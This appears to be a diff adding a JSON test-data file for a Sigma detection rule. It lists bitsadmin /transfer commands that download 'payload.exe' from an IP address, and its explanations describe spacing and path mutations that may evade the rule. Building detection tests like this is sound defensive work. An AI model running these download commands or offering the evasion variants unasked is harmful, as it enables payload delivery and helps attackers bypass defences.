@@ -1,0 +1,18 @@
+[
+  {
+    "output": "bitsadmin /transfer MyJob http://10.10.10.10/payload.exe payload.exe",
+    "explanation": "This command is a direct match to the Sigma rule's detection criteria, as it uses bitsadmin.exe with /transfer and an IP-based URL. It serves as a baseline for testing detection accuracy."
+  },
+  {
+    "output": "bitsadmin.exe  /transfer   MyJob   http://10.10.10.10/payload.exe   payload.exe",
+    "explanation": "Extra spaces are inserted between arguments, which is a common mutation technique. The command remains functionally identical but may evade detection if the rule does not account for spacing variations."
+  },
+  {
+    "output": "bitsadmin.exe /transfer MyJob http://10.10.10.10/payload.exe .\\payload.exe",
+    "explanation": "The output file path is modified using a relative path (.\\payload.exe) instead of just payload.exe. This is a safe mutation that may bypass detection if the rule does not account for path normalization."
+  },
+  {
+    "output": "bitsadmin.exe /transfer MyJob http://10.10.10.10/payload.exe payload.exe",
+    "explanation": "This is the original command with no mutation. It is included for completeness and to confirm detection behavior."
+  }
+]
